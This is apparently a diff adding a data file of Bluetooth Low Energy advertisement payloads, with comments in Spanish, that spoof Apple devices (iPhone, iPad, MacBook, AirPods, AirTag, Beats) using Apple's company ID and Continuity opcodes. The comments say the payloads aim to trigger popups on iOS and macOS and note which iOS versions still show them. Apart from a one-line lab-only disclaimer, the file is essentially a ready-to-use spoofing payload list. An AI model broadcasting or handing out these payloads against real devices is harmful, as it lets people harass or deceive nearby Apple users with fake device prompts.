@@ -1,0 +1,15 @@
+# ble_payloads/apple.txt — payloads BLE que buscan ser vistos por iOS/macOS.
+# Marco: SOLO lab / dispositivos propios o con permiso.
+# Formato por linea:  name=<string>|cid=<4-hex>|data=<hex-pairs>
+# cid=004c -> Apple Inc. (company ID BLE)
+# Los payloads son del tipo "Apple Continuity" (OpCode + len + data). Los OpCodes:
+#   0x05 AirDrop   0x07 AirPods      0x09 Airplay    0x0C Handoff
+#   0x10 Nearby    0x16 Nearby-ongoing            etc.
+# iOS 17.2+ limita el popup de AirPods; en iOS 16- aun se ve.
+name=iPhone 15 Pro|cid=004c|data=10 06 51 1C BA 51 05
+name=iPad Air|cid=004c|data=10 06 51 1A 00 00 00 00
+name=MacBook Pro|cid=004c|data=10 05 03 1C BA 51 05
+name=AirPods Pro|cid=004c|data=07 19 07 02 20 75 AA 30 01 00 00 45 12 12 00 00 00 00 00
+name=AirPods Max|cid=004c|data=07 19 07 0A 20 75 AA 30 01 00 00 45 12 12 00 00 00 00 00
+name=AirTag|cid=004c|data=12 19 00 1F 09 BC D5 2A 7D 1B 06 7F 7B 85 C8 F2 86 DC
+name=Beats Studio|cid=004c|data=07 19 01 0F 20 2C B8 10 00 01 00
